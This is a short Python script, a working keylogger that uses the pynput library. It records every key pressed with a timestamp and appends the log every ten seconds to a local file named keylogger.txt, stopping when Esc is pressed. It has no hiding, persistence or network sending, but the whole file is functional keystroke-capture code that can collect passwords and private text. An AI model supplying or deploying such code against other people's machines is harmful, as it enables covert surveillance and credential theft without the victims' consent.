import os
import threading
from datetime import datetime
from pynput import keyboard

text = ""
file_path = os.path.join(os.getcwd(), "keylogger.txt")
time_interval = 10

timer = None

def write_to_file():
    global text, timer
    try:
        if text:
            with open(file_path, "a") as file:
                file.write(text)
                text = ""
        timer = threading.Timer(time_interval, write_to_file)
        timer.start()
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_press(key):
    global text, timer
    try:
        if key == keyboard.Key.esc:
            if timer:
                timer.cancel()
            return False
        
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        if key == keyboard.Key.enter:
            text += f"{timestamp} User pressed: <Enter>\n"
        elif key == keyboard.Key.tab:
            text += f"{timestamp} User pressed: <Tab>\n"
        elif key == keyboard.Key.space:
            text += f"{timestamp} User pressed: <Space>\n"
        elif key == keyboard.Key.backspace:
            text += f"{timestamp} User pressed: <Backspace>\n"
        else:
            key_str = str(key).replace("'", "")
            text += f"{timestamp} User pressed: {key_str}\n"
    except Exception as e:
        print(f"Error logging key: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    with open(file_path, "a") as file:
        file.write(f"--- Keylogging session started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
    write_to_file()
    listener.join()
